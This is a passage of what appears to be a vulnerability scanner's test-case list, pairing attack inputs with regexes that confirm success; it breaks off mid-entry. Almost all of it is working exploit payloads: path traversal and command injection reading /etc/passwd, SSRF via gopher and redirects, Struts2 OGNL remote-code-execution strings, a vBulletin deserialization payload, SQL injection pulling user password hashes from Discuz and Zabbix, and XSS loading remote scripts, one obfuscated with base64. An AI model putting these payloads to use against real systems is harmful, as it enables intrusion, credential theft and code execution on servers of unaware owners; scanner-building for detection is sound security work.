        "target": "((root|bin|daemon|sys|system|sync|games|man|mail|news|www-data|uucp|backup|list|proxy|gnats|nobody|syslog|mysql|bind|ftp|sshd|postfix):[\\d\\w-\\s,]+:\\d+:\\d+:[\\w-_\\s,]*:[\\w-_\\s,\\/]*:[\\w-_,\\/]*[\\r\\n])|(TLib_[A-Za-z]{1,8}_[A-Za-z]{1,8}\\(\\):)|(root:x:0:0:|bin:x:|nobody:x:|system:x:0:0)",
        "input": "..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd",
        "encode":  "NO",
    },

    {
        "case_id": 1040010002,
        "target": "((root|bin|daemon|sys|system|sync|games|man|mail|news|www-data|uucp|backup|list|proxy|gnats|nobody|syslog|mysql|bind|ftp|sshd|postfix):[\\d\\w-\\s,]+:\\d+:\\d+:[\\w-_\\s,]*:[\\w-_\\s,\\/]*:[\\w-_,\\/]*[\\r\\n])|(TLib_[A-Za-z]{1,8}_[A-Za-z]{1,8}\\(\\):)|(root:x:0:0:|bin:x:|nobody:x:|system:x:0:0)",
        "input": "..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00.",
        "encode":  "NO",
    },

    {
        "case_id": 1040010001,
        "target": "((root|bin|daemon|sys|system|sync|games|man|mail|news|www-data|uucp|backup|list|proxy|gnats|nobody|syslog|mysql|bind|ftp|sshd|postfix):[\\d\\w-\\s,]+:\\d+:\\d+:[\\w-_\\s,]*:[\\w-_\\s,\\/]*:[\\w-_,\\/]*[\\r\\n])|(TLib_[A-Za-z]{1,8}_[A-Za-z]{1,8}\\(\\):)|(root:x:0:0:|bin:x:|nobody:x:|system:x:0:0)",
        "input": "%26cat%20%2fetc%2fpasswd",
        "encode":  "NO",
    },

    {
        "case_id": 1040010104,
        "target": "((root|bin|daemon|sys|system|sync|games|man|mail|news|www-data|uucp|backup|list|proxy|gnats|nobody|syslog|mysql|bind|ftp|sshd|postfix):[\\d\\w-\\s,]+:\\d+:\\d+:[\\w-_\\s,]*:[\\w-_\\s,\\/]*:[\\w-_,\\/]*[\\r\\n])|(TLib_[A-Za-z]{1,8}_[A-Za-z]{1,8}\\(\\):)|(root:x:0:0:|bin:x:|nobody:x:|system:x:0:0)",
        "input": "//....//....//....//....//....//....//....//....//....//....//....//etc/passwd",
        "encode":  "NO",
    },

    {
        "case_id": 1040010105,
        "input": "http://113.105.95.124/Tst_Anyfile0.php",
        "target": "((root|bin|daemon|sys|system|sync|games|man|mail|news|www-data|uucp|backup|list|proxy|gnats|nobody|syslog|mysql|bind|ftp|sshd|postfix):[\\d\\w-\\s,]+:\\d+:\\d+:[\\w-_\\s,]*:[\\w-_\\s,\\/]*:[\\w-_,\\/]*[\\r\\n])|(TLib_[A-Za-z]{1,8}_[A-Za-z]{1,8}\\(\\):)|(root:x:0:0:|bin:x:|nobody:x:|system:x:0:0)",
        "encode":  "NO",
    },

    {
        "case_id": 1040010106,
        "input": "http://113.105.95.124/Tst_Anyfile1.php",
        "target": "((root|bin|daemon|sys|system|sync|games|man|mail|news|www-data|uucp|backup|list|proxy|gnats|nobody|syslog|mysql|bind|ftp|sshd|postfix):[\\d\\w-\\s,]+:\\d+:\\d+:[\\w-_\\s,]*:[\\w-_\\s,\\/]*:[\\w-_,\\/]*[\\r\\n])|(TLib_[A-Za-z]{1,8}_[A-Za-z]{1,8}\\(\\):)|(root:x:0:0:|bin:x:|nobody:x:|system:x:0:0)",
        "encode":  "NO",
    },

    {
        "case_id": 1040010107,
        "input": "http://113.105.95.124/Tst_Anyfile2.php",
        "target": "((root|bin|daemon|sys|system|sync|games|man|mail|news|www-data|uucp|backup|list|proxy|gnats|nobody|syslog|mysql|bind|ftp|sshd|postfix):[\\d\\w-\\s,]+:\\d+:\\d+:[\\w-_\\s,]*:[\\w-_\\s,\\/]*:[\\w-_,\\/]*[\\r\\n])|(TLib_[A-Za-z]{1,8}_[A-Za-z]{1,8}\\(\\):)|(root:x:0:0:|bin:x:|nobody:x:|system:x:0:0)",
        "encode":  "NO",
    },

    {
        "case_id": 1040010108,
        "input": "http://113.105.95.124/Tst_Anyfile3.php",
        "target": "((root|bin|daemon|sys|system|sync|games|man|mail|news|www-data|uucp|backup|list|proxy|gnats|nobody|syslog|mysql|bind|ftp|sshd|postfix):[\\d\\w-\\s,]+:\\d+:\\d+:[\\w-_\\s,]*:[\\w-_\\s,\\/]*:[\\w-_,\\/]*[\\r\\n])|(TLib_[A-Za-z]{1,8}_[A-Za-z]{1,8}\\(\\):)|(root:x:0:0:|bin:x:|nobody:x:|system:x:0:0)",
        "encode":  "NO",
    },

]

ssrf_leak_detect_test_cases = [

    {
        "case_id": 1200010001,
        "target": "SSrF_Tst_scan_tsT_check|SSrF_Tst_scan_check_tItlE",
        "input": "http://10.133.6.20/Tst_SsrF.html",
        "encode":  "NO",
    },

    {
        "case_id": 1200010016,
        "input": "gopher%3A%2F%2F113.105.95.124%3A80%2F_GET%2520%2FTst_SsrF.html%2520HTTP%2F1.1%250d%250aHost%3A%2520113.105.95.124%250d%250aConnection%3A%2520close%250d%250aContent-Length%3A%25200%250d%250a%250d%250a%250d%250a",
        "target": "SSrF_Tst_scan_tsT_check|SSrF_Tst_scan_check_tItlE",
        "encode":  "ALL",
    },

    {
        "case_id": 1200010040,
        "input": "http://10.133.6.20/ssrf.bmp",
        "target": "19900402520",
        "encode":  "ALL",
    },

    {
        "case_id": 1200010042,
        "input": "http://10.133.6.20/ssrf.jpg",
        "target": "19900402520",
        "encode":  "ALL",
    },

    {
        "case_id": 1200010041,
        "input": "http://10.133.6.20/ssrf.gif",
        "target": "19900402520",
        "encode":  "ALL",
    },

    {
        "case_id": 1200010039,
        "input": "http://10.133.6.20/ssrf.ico",
        "target": "19900402520",
        "encode":  "ALL",
    },

    {
        "case_id": 1200010006,
        "input": "http://www.qq.com@10.133.6.20/Tst_SsrF.html",
        "target": "SSrF_Tst_scan_tsT_check|SSrF_Tst_scan_check_tItlE",
        "encode":  "NO",
    },

    {
        "case_id": 1200010007,
        "input": "http://www.10.133.6.20.xip.io/Tst_SsrF.html",
        "target": "SSrF_Tst_scan_tsT_check|SSrF_Tst_scan_check_tItlE",
        "encode":  "NO",
    },

    {
        "case_id": 1200010043,
        "input": "http://10.133.6.20/ssrf.png",
        "target": "19900402520",
        "encode":  "ALL",
    },

    {
        "case_id": 1200010009,
        "input": "http://dwz.cn/2mZEkD",
        "target": "SSrF_Tst_scan_tsT_check|SSrF_Tst_scan_check_tItlE",
        "encode":  "NO",
    },

    {
        "case_id": 1200010010,
        "input": "http://10.133.6.20/Tst_SsrF.html?www.qq.com",
        "target": "SSrF_Tst_scan_tsT_check|SSrF_Tst_scan_check_tItlE",
        "encode":  "ALL",
    },

    {
        "case_id": 1200010017,
        "input": "gopher%3A%2F%2F113.105.95.124%3A80%2F_GET%2520%2FTst_SsrF.html%2520HTTP%2F1.1%250d%250aHost%3A%2520113.105.95.124%250d%250aConnection%3A%2520close%250d%250aPragma%3A%2520no-cache%250d%250aCache-Control%3A%2520no-cache%250d%250aAccept%3A%2520text%2Fhtml%2Capplication%2Fxhtml%2Bxml%2Capplication%2Fxml%3Bq%3D0.9%2Cimage%2Fwebp%2C%2A%2F%2A%3Bq%3D0.8%250d%250aUser-Agent%3A%2520Mozilla%2F5.0%2520%28Windows%2520NT%25206.1%3B%2520WOW64%29%2520AppleWebKit%2F537.36%2520%28KHTML%2C%2520like%2520Gecko%29%2520Chrome%2F50.0.2661.94%2520Safari%2F537.36%250d%250aAccept-Encoding%3A%2520gzip%2C%2520deflate%2C%2520sdch%250d%250aAccept-Language%3A%2520zh-CN%2Czh%3Bq%3D0.8%250d%250aContent-Length%3A%25200%250d%250a%250d%250a%250d%250a",
        "target": "SSrF_Tst_scan_tsT_check|SSrF_Tst_scan_check_tItlE",
        "encode":  "ALL",
    },

    {
        "case_id": 1200010018,
        "input": "http://tst.qq.com/Tst_SsrF.html",
        "target": "SSrF_Tst_scan_tsT_check|SSrF_Tst_scan_check_tItlE",
        "encode":  "ALL",
    },

    {
        "case_id": 1200010019,
        "input": "http://10.153.131.141:12345/Tst_SsrF.html",
        "target": "SSrF_Tst_scan_tsT_check|SSrF_Tst_scan_check_tItlE",
        "encode":  "ALL",
    },

    {
        "case_id": 1200010020,
        "input": "http://10.133.6.20/ssrf.png",
        "target": "3e06b84bb301d59f6368434962d1f677",
        "encode":  "ALL",
    },

    {
        "case_id": 1200010021,
        "input": "http://10.133.6.20/ssrf.jpg",
        "target": "6bb58538f7db3d0d9d35ac0be8083115",
        "encode":  "ALL",
    },

    {
        "case_id": 1200010022,
        "input": "http://10.133.6.20/ssrf.ico",
        "target": "9dd38aa7a978dca444e5ba260f2b6411",
        "encode":  "ALL",
    },

    {
        "case_id": 1200010024,
        "input": "http://10.133.6.20/ssrf.gif",
        "target": "198b65719965192dd8f962d78b59f1ca",
        "encode":  "ALL",
    },

    {
        "case_id": 1200010023,
        "input": "http://10.133.6.20/ssrf.bmp",
        "target": "f253842eebbbaea8dfb620e49d827b4d",
        "encode":  "ALL",
    },

    {
        "case_id": 1200010025,
        "input": "http://113.105.95.124/g0.php",
        "target": "SSrF_Tst_scan_tsT_check|SSrF_Tst_scan_check_tItlE",
        "encode":  "ALL",
    },

    {
        "case_id": 1200010026,
        "input": "http://113.105.95.124/g1.php",
        "target": "SSrF_Tst_scan_tsT_check|SSrF_Tst_scan_check_tItlE",
        "encode":  "ALL",
    },

    {
        "case_id": 1200010027,
        "input": "http://113.105.95.124/302_redirect.php?url=http://10.133.6.20/Tst_SsrF.html",
        "target": "SSrF_Tst_scan_tsT_check|SSrF_Tst_scan_check_tItlE",
        "encode":  "ALL",
    },

    {
        "case_id": 1200010028,
        "input": "http://tst2.qq.com/302_redirect.php?url=http://10.133.6.20/Tst_SsrF.html",
        "target": "SSrF_Tst_scan_tsT_check|SSrF_Tst_scan_check_tItlE",
        "encode":  "ALL",
    },

    {
        "case_id": 1200010029,
        "input": "http://tst2.qq.com/Tst_SsrF_Jump.php",
        "target": "SSrF_Tst_scan_tsT_check|SSrF_Tst_scan_check_tItlE",
        "encode":  "ALL",
    },

    {
        "case_id": 1200010030,
        "input": "http://113.105.95.124/Tst_SsrF_Jump.php",
        "target": "SSrF_Tst_scan_tsT_check|SSrF_Tst_scan_check_tItlE",
        "encode":  "ALL",
    },

    {
        "case_id": 1200010031,
        "input": "10.133.6.20/Tst_SsrF.html",
        "target": "SSrF_Tst_scan_tsT_check|SSrF_Tst_scan_check_tItlE",
        "encode":  "ALL",
    },

    {
        "case_id": 1200010032,
        "input": "http://10.153.138.81/ssrf/ssrf.jpg?rndstr",
        "target": "--blind_attack--",
        "encode":  "ALL",
    },

    {
        "case_id": 1200010033,
        "input": "http://10.153.138.81/ssrf/ssrf.ico?rndstr",
        "target": "--blind_attack--",
        "encode":  "ALL",
    },

    {
        "case_id": 1200010034,
        "input": "http://tst.qq.com/ssrf/ssrf.jpg?rndstr",
        "target": "--blind_attack--",
        "encode":  "ALL",
    },

    {
        "case_id": 1200010035,
        "input": "http://10.153.138.81:12345/ssrf/ssrf.jpg?rndstr",
        "target": "--blind_attack--",
        "encode":  "ALL",
    },

    {
        "case_id": 1200010036,
        "input": "http://tst.qq.com:12345/ssrf/ssrf.jpg?rndstr",
        "target": "--blind_attack--",
        "encode":  "ALL",
    },

    {
        "case_id": 1200010037,
        "input": "http://113.105.95.124/302_redirect.php?url=http://10.153.138.81/ssrf/ssrf.jpg?rndstr",
        "target": "--blind_attack--",
        "encode":  "ALL",
    },

    {
        "case_id": 1200010038,
        "input": "http://113.105.95.124/g2.php?rndstr",
        "target": "--blind_attack--",
        "encode":  "ALL",
    },

]

struts_low_version_detect_test_cases = [

    {
        "case_id": 1110010025,
        "input": "?redirect:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{%27cat%27,%27/etc/passwd%27})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()}",
        "target": "((root|bin|daemon|sys|sync|games|man|mail|news|www-data|uucp|backup|list|proxy|gnats|nobody|syslog|mysql|bind|ftp|sshd|postfix):[\\d\\w-\\s,]+:\\d+:\\d+:[\\w-_\\s,]*:[\\w-_\\s,\\/]*:[\\w-_,\\/]*[\\r\\n])",
        "encode":  "NO",
    },

    {
        "case_id": 1110010024,
        "target": "((root|bin|daemon|sys|sync|games|man|mail|news|www-data|uucp|backup|list|proxy|gnats|nobody|syslog|mysql|bind|ftp|sshd|postfix):[\\d\\w-\\s,]+:\\d+:\\d+:[\\w-_\\s,]*:[\\w-_\\s,\\/]*:[\\w-_,\\/]*[\\r\\n])",
        "input": "?redirect:${%23a%3d(new java.lang.ProcessBuilder(new java.lang.String[]{'cat','/etc/passwd'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew java.io.InputStreamReader(%23b),%23d%3dnew java.io.BufferedReader(%23c),%23e%3dnew char[50000],%23d.read(%23e),%23matt%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()}",
        "encode":  "NO",
    },

    {
        "case_id": 1110010023,
        "target": "tstwebscan",
        "input": "?aaa=1${#_memberAccess['allowStaticMethodAccess']=true,@org.apache.struts2.ServletActionContext@getResponse().getWriter().print('simwebscan'.replace('sim','tst')).close()}",
        "encode":  "NO",
    },

    {
        "case_id": 1110010022,
        "target": "tstwebscan",
        "input": "?class.classLoader.jarPath=%28%23context[%22xwork.MethodAccessor.denyMethodExecution%22]%3d+new+java.lang.Boolean%28false%29%2c+%23_memberAccess[%22allowStaticMethodAccess%22]%3dtrue%2c%23ddd%3d%40org.apache.struts2.ServletActionContext%40getResponse%28%29.getWriter%28%29%2c%23ddd.println%28%27simwebscan%27.replace%28%27sim%27,%27tst%27%29%29%2c%23ddd.close%28%29%29%28meh%29&z[%28class.classLoader.jarPath%29%28%27meh%27%29]",
        "encode":  "NO",
    },

    {
        "case_id": 1110010021,
        "target": "tstwebscan",
        "input": "'%2b(%23_memberAccess[%22allowStaticMethodAccess%22]=true,%23response=@org.apache.struts2.ServletActionContext@getResponse(),%23response.getWriter().print('simwebscan'.replace('sim','tst'))%2b'",
        "encode":  "NO",
    },

    {
        "case_id": 1110010020,
        "target": "tstwebscan",
        "input": "?foo=%28%23context[%22xwork.MethodAccessor.denyMethodExecution%22]%3D+new+java.lang.Boolean%28false%29,%20%23_memberAccess[%22allowStaticMethodAccess%22]%3d+new+java.lang.Boolean%28true%29,%23response=@org.apache.struts2.ServletActionContext@getResponse(),%23response.getWriter().print('simwebscan'.replace('sim','tst'))(meh%29&z[%28foo%29%28%27meh%27%29]=true",
        "encode":  "NO",
    },

    {
        "case_id": 1110010019,
        "target": "((root|bin|daemon|sys|sync|games|man|mail|news|www-data|uucp|backup|list|proxy|gnats|nobody|syslog|mysql|bind|ftp|sshd|postfix):[\\d\\w-\\s,]+:\\d+:\\d+:[\\w-_\\s,]*:[\\w-_\\s,\\/]*:[\\w-_,\\/]*[\\r\\n])",
        "input": "('\\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('\\43context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\75false')(b))&('\\43c')(('\\43_memberAccess.excludeProperties\\75@java.util.Collections@EMPTY_SET')(c))&(g)(('\\43mycmd\\75\\'cat\\40\\u002fetc\\u002fpasswd'')(d))&(h)(('\\43myret\\75@java.lang.Runtime@getRuntime().exec(\\43mycmd)')(d))&(i)(('\\43mydat\\75new\\40java.io.DataInputStream(\\43myret.getInputStream())')(d))&(j)(('\\43myres\\75new\\40byte[51020]')(d))&(k)(('\\43mydat.readFully(\\43myres)')(d))&(l)(('\\43mystr\\75new\\40java.lang.String(\\43myres)')(d))&(m)(('\\43myout\\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(n)(('\\43myout.getWriter().println(\\43mystr)')(d))",
        "encode":  "ALL",
    },

    {
        "case_id": 1110010018,
        "target": "((root|bin|daemon|sys|sync|games|man|mail|news|www-data|uucp|backup|list|proxy|gnats|nobody|syslog|mysql|bind|ftp|sshd|postfix):[\\d\\w-\\s,]+:\\d+:\\d+:[\\w-_\\s,]*:[\\w-_\\s,\\/]*:[\\w-_,\\/]*[\\r\\n])",
        "input": "?class.classLoader.jarPath=%28%23context[%22xwork.MethodAccessor.denyMethodExecution%22]%3d+new+java.lang.Boolean%28false%29%2c+%23_memberAccess[%22allowStaticMethodAccess%22]%3dtrue%2c%23ddd%3d%40org.apache.struts2.ServletActionContext%40getResponse%28%29.getWriter%28%29%2c%23ddd.print%28%27simwebscan%27.replace%28%27sim%27,%27tst%27%29%29%2c%23ddd.close%28%29%29%28meh%29&z[%28class.classLoader.jarPath%29%28%27meh%27%29]",
        "encode":  "NO",
    },

    {
        "case_id": 1110010017,
        "target": "((root|bin|daemon|sys|sync|games|man|mail|news|www-data|uucp|backup|list|proxy|gnats|nobody|syslog|mysql|bind|ftp|sshd|postfix):[\\d\\w-\\s,]+:\\d+:\\d+:[\\w-_\\s,]*:[\\w-_\\s,\\/]*:[\\w-_,\\/]*[\\r\\n])",
        "input": "?debug=command&expression=%23f=%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29,%23f.setAccessible%28true%29,%23f.set%28%23_memberAccess,true%29,%23req=@org.apache.struts2.ServletActionContext@getRequest%28%29,%23resp=@org.apache.struts2.ServletActionContext@getResponse%28%29.getWriter%28%29,%23a=%28new%20java.lang.ProcessBuilder%28new%20java.lang.String[]{%27cat%27,%27/etc/passwd%27}%29%29.start%28%29,%23b=%23a.getInputStream%28%29,%23c=new%20java.io.InputStreamReader%28%23b%29,%23d=new%20java.io.BufferedReader%28%23c%29,%23e=new%20char[1000],%23d.read%28%23e%29,%23resp.println%28%23e%29,%23resp.close%28%29",
        "encode":  "NO",
    },

    {
        "case_id": 1110010007,
        "target": "((root|bin|daemon|sys|sync|games|man|mail|news|www-data|uucp|backup|list|proxy|gnats|nobody|syslog|mysql|bind|ftp|sshd|postfix):[\\d\\w-\\s,]+:\\d+:\\d+:[\\w-_\\s,]*:[\\w-_\\s,\\/]*:[\\w-_,\\/]*[\\r\\n])",
        "input": "('\\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('\\43context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\75false')(b))&('\\43c')(('\\43_memberAccess.excludeProperties\\75@java.util.Collections@EMPTY_SET')(c))&(g)(('\\43mycmd\\75\\'cat\\40\\u002fetc\\u002fpasswd'')(d))&(h)(('\\43myret\\75@java.lang.Runtime@getRuntime().exec(\\43mycmd)')(d))&(i)(('\\43mydat\\75new\\40java.io.DataInputStream(\\43myret.getInputStream())')(d))&(j)(('\\43myres\\75new\\40byte[51020]')(d))&(k)(('\\43mydat.readFully(\\43myres)')(d))&(l)(('\\43mystr\\75new\\40java.lang.String(\\43myres)')(d))&(m)(('\\43myout\\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(n)(('\\43myout.getWriter().println(\\43mystr)')(d))",
        "encode":  "ALL",
    },

    {
        "case_id": 1110010008,
        "target": "tstwebscan",
        "input": "?foo=%28%23context[%22xwork.MethodAccessor.denyMethodExecution%22]%3D+new+java.lang.Boolean%28false%29,%20%23_memberAccess[%22allowStaticMethodAccess%22]%3d+new+java.lang.Boolean%28true%29,%23response=@org.apache.struts2.ServletActionContext@getResponse(),%23response.getWriter().print('simwebscan'.replace('sim','tst'))(meh%29&z[%28foo%29%28%27meh%27%29]=true",
        "encode":  "NO",
    },

    {
        "case_id": 1110010011,
        "target": "tstwebscan",
        "input": "?aaa=1${#_memberAccess['allowStaticMethodAccess']=true,@org.apache.struts2.ServletActionContext@getResponse().getWriter().print('simwebscan'.replace('sim','tst')).close()}",
        "encode":  "NO",
    },

    {
        "case_id": 1110010012,
        "target": "((root|bin|daemon|sys|sync|games|man|mail|news|www-data|uucp|backup|list|proxy|gnats|nobody|syslog|mysql|bind|ftp|sshd|postfix):[\\d\\w-\\s,]+:\\d+:\\d+:[\\w-_\\s,]*:[\\w-_\\s,\\/]*:[\\w-_,\\/]*[\\r\\n])",
        "input": "?redirect:${%23a%3d(new java.lang.ProcessBuilder(new java.lang.String[]{'cat','/etc/passwd'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew java.io.InputStreamReader(%23b),%23d%3dnew java.io.BufferedReader(%23c),%23e%3dnew char[50000],%23d.read(%23e),%23matt%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()}",
        "encode":  "NO",
    },

    {
        "case_id": 1110010013,
        "target": "<title>OGNL\\\\s*Console<\\\\/title>",
        "input": "/struts/webconsole.html",
        "encode":  "NO",
    },

    {
        "case_id": 1110010009,
        "target": "tstwebscan",
        "input": "'%2b(%23_memberAccess[%22allowStaticMethodAccess%22]=true,%23response=@org.apache.struts2.ServletActionContext@getResponse(),%23response.getWriter().print('simwebscan'.replace('sim','tst'))%2b'",
        "encode":  "ALL",
    },

    {
        "case_id": 1110010010,
        "target": "tstwebscan",
        "input": "?class.classLoader.jarPath=%28%23context[%22xwork.MethodAccessor.denyMethodExecution%22]%3d+new+java.lang.Boolean%28false%29%2c+%23_memberAccess[%22allowStaticMethodAccess%22]%3dtrue%2c%23ddd%3d%40org.apache.struts2.ServletActionContext%40getResponse%28%29.getWriter%28%29%2c%23ddd.println%28%27simwebscan%27.replace%28%27sim%27,%27tst%27%29%29%2c%23ddd.close%28%29%29%28meh%29&z[%28class.classLoader.jarPath%29%28%27meh%27%29]",
        "encode":  "NO",
    },

    {
        "case_id": 1110010002,
        "input": "http://host/struts2-blank/example/X.action?action:%25{10245*954813}",
        "target": "9782059185",
        "encode":  "NO",
    },

    {
        "case_id": 1110010003,
        "input": "http://host/struts2-showcase/employee/save.action?redirect:%25{10245*954813}",
        "target": "9782059185",
        "encode":  "NO",
    },

    {
        "case_id": 1110010004,
        "target": "tst_webscan",
        "input": "?debug=command&expression=%23_memberAccess[%22allowStaticMethodAccess%22]=true,%23req=@org.apache.struts2.ServletActionContext@getRequest(),%23xman=@org.apache.struts2.ServletActionContext@getResponse(),%23xman.getWriter().println(%22simwebscan%22.replace(%22sim%22,%22tst%22)),%23xman.getWriter().close()",
        "encode":  "NO",
    },

    {
        "case_id": 1110010005,
        "target": "((root|bin|daemon|sys|sync|games|man|mail|news|www-data|uucp|backup|list|proxy|gnats|nobody|syslog|mysql|bind|ftp|sshd|postfix):[\\d\\w-\\s,]+:\\d+:\\d+:[\\w-_\\s,]*:[\\w-_\\s,\\/]*:[\\w-_,\\/]*[\\r\\n])",
        "input": "?debug=command&expression=%23f=%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29,%23f.setAccessible%28true%29,%23f.set%28%23_memberAccess,true%29,%23req=@org.apache.struts2.ServletActionContext@getRequest%28%29,%23resp=@org.apache.struts2.ServletActionContext@getResponse%28%29.getWriter%28%29,%23a=%28new%20java.lang.ProcessBuilder%28new%20java.lang.String[]{%27cat%27,%27/etc/passwd%27}%29%29.start%28%29,%23b=%23a.getInputStream%28%29,%23c=new%20java.io.InputStreamReader%28%23b%29,%23d=new%20java.io.BufferedReader%28%23c%29,%23e=new%20char[1000],%23d.read%28%23e%29,%23resp.println%28%23e%29,%23resp.close%28%29",
        "encode":  "NO",
    },

    {
        "case_id": 1110010006,
        "target": "((root|bin|daemon|sys|sync|games|man|mail|news|www-data|uucp|backup|list|proxy|gnats|nobody|syslog|mysql|bind|ftp|sshd|postfix):[\\d\\w-\\s,]+:\\d+:\\d+:[\\w-_\\s,]*:[\\w-_\\s,\\/]*:[\\w-_,\\/]*[\\r\\n])",
        "input": "?class.classLoader.jarPath=%28%23context[%22xwork.MethodAccessor.denyMethodExecution%22]%3d+new+java.lang.Boolean%28false%29%2c+%23_memberAccess[%22allowStaticMethodAccess%22]%3dtrue%2c%23ddd%3d%40org.apache.struts2.ServletActionContext%40getResponse%28%29.getWriter%28%29%2c%23ddd.print%28%27simwebscan%27.replace%28%27sim%27,%27tst%27%29%29%2c%23ddd.close%28%29%29%28meh%29&z[%28class.classLoader.jarPath%29%28%27meh%27%29]",
        "encode":  "NO",
    },

    {
        "case_id": 1110010001,
        "target": "<title>OGNL\\\\s*Console<\\\\/title>",
        "input": "/struts/webconsole.html",
        "encode":  "NO",
    },

    {
        "case_id": 1110010016,
        "target": "tst_webscan",
        "input": "?debug=command&expression=%23_memberAccess[%22allowStaticMethodAccess%22]=true,%23req=@org.apache.struts2.ServletActionContext@getRequest(),%23xman=@org.apache.struts2.ServletActionContext@getResponse(),%23xman.getWriter().println(%22simwebscan%22.replace(%22sim%22,%22tst%22)),%23xman.getWriter().close()",
        "encode":  "NO",
    },

]

vbulletin_detect_test_cases = [

    {
        "case_id": 1200060001,
        "target": "<title>phpinfo\\(\\)<\\/title>",
        "input": "ajax/api/hook/decodeArguments?arguments=O%3A12%3A%22vB_dB_Result%22%3A2%3A%7Bs%3A5%3A%22%00%2a%00db%22%3BO%3A11%3A%22vB_Database%22%3A1%3A%7Bs%3A9%3A%22functions%22%3Ba%3A1%3A%7Bs%3A11%3A%22free_result%22%3Bs%3A7%3A%22phpinfo%22%3B%7D%7Ds%3A12%3A%22%00%2a%00recordset%22%3Bi%3A1%3B%7D",
        "encode":  "NO",
    },

]

discuz_72_sqlinject_test_cases = [

    {
        "case_id": 1200070004,
        "input": "/faq.php?action=grouppermission&gids[99]=%27&gids[100][0]=%29%20and%20%28select%201%20from%20%28select%20count%28*%29,concat%28%28select%20concat%28username,0x3a,password,0x3a,salt%29%20from%20uc_members%20limit%200,1%29,floor%28rand%280%29*2%29%29x%20from%20information_schema.tables%20group%20by%20x%29a%29%23",
        "target": "Discuz[^\\r\\n]*MySQL\\sQuery\\sError",
        "encode":  "NO",
    },

    {
        "case_id": 1200070005,
        "input": "/bbs/faq.php?action=grouppermission&gids[99]=%27&gids[100][0]=%29%20and%20%28select%201%20from%20%28select%20count%28*%29,concat%28%28select%20concat%28username,0x3a,password,0x3a,salt%29%20from%20uc_members%20limit%200,1%29,floor%28rand%280%29*2%29%29x%20from%20information_schema.tables%20group%20by%20x%29a%29%23",
        "target": "Discuz[^\\r\\n]*MySQL\\sQuery\\sError",
        "encode":  "NO",
    },

    {
        "case_id": 1200070006,
        "input": "/forum/faq.php?action=grouppermission&gids[99]=%27&gids[100][0]=%29%20and%20%28select%201%20from%20%28select%20count%28*%29,concat%28%28select%20concat%28username,0x3a,password,0x3a,salt%29%20from%20uc_members%20limit%200,1%29,floor%28rand%280%29*2%29%29x%20from%20information_schema.tables%20group%20by%20x%29a%29%23",
        "target": "Discuz[^\\r\\n]*MySQL\\sQuery\\sError",
        "encode":  "NO",
    },

]

utf7_xss_detect_test_cases = [

    {
        "case_id": 1200080002,
        "input": "+/v8%20",
        "target": "^\\+\\/v8",
        "encode":  "ALL",
    },

    {
        "case_id": 1200080003,
        "input": "%2B%2Fv8",
        "target": "^\\+\\/v8",
        "encode":  "ALL",
    },

]

waf_detect_test_cases = [

    {
        "case_id": 1200090001,
        "input": "/waf_detect.php?id=1",
        "target": "nil",
        "encode":  "NO",
    },

]

uploadfile_find_test_cases = [

    {
        "case_id": 1200120001,
        "input": "nil",
        "target": "<input[^\\r\\n<]*type\\s*=\\s*\\\\?('|\")file\\\\?('|\")[^\\r\\n>]*\\/?>",
        "encode":  "NO",
    },

]

zabbix_cve_sql_inject_detect_test_cases = [

    {
        "case_id": 1200150001,
        "input": "/httpmon.php?applications=2%20and%20(select%201%20from%20(select%20count(*),concat((select(select%20concat(cast(concat(alias,0x7e,passwd,0x7e)%20as%20char),0x7e))%20from%20zabbix.users%20LIMIT%200,1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)",
        "target": "Error in query \\[.*\\]",
        "encode":  "NO",
    },

]

Solr_Unauthorized_Access_test_cases = [

    {
        "case_id": 1200140001,
        "input": "/solr/",
        "target": "Solr\\sAdmin",
        "encode":  "NO",
    },

]

dedecms_sqlinject_detect_test_cases = [

    {
        "case_id": 1200160001,
        "input": "/plus/recommend.php?action=&aid=1&_FILES[type][tmp_name]=\\%27%20&_FILES[type][name]=1.jpg&_FILES[type][type]=application/octet-stream&_FILES[type][size]=4294",
        "target": "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '[^']*'",
        "encode":  "NO",
    },

]


xss_writein_with_js_test_cases = [

    {
        "case_id": 1200170001,
        "input": "'\"><script src=\"http://js.aq.qq.com/js/tst_scan.js\"></script>",
        "target": "tst_xss_scan",
        "encode":  "ALL",
    },

    {
        "case_id": 1200170002,
        "input": "'\"><script src=\"https://js.aq.qq.com/js/tst_scan.js\"></script>",
        "target": "tst_xss_scan",
        "encode":  "ALL",
    },

    {
        "case_id": 1200170003,
        "input": "<svg/onload=\"s=document.createElement('script');document.body.appendChild(s);s.src='http://t.cn/RUD5JLn'\">",
        "target": "tst_xss_scan",
        "encode":  "ALL",
    },

    {
        "case_id": 1200170004,
        "input": "<svg/onload=\"eval(atob('cz1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHMpO3Muc3JjPSdodHRwOi8vdC5jbi9SVUQ1SkxuJw=='))\">",
